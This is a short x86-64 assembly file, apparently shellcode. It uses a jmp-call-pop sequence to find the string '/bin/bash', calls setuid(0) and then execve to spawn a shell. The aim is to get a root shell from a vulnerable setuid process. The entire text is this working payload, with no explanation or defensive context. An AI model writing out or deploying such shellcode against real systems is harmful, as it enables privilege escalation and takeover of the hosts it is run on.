.global _start
_start:
.intel_syntax noprefix
        jmp binbash
        ############################  setuid(0)   ##############################
test:
        xor eax, eax
        add eax, 105
        xor edi, edi
        syscall

        ############################   call execve
        xor eax, eax
        add eax, 59

        pop rdi
        xor esi, esi
        xor edx, edx
        syscall
binbash:
        call test
        .string "/bin/bash"
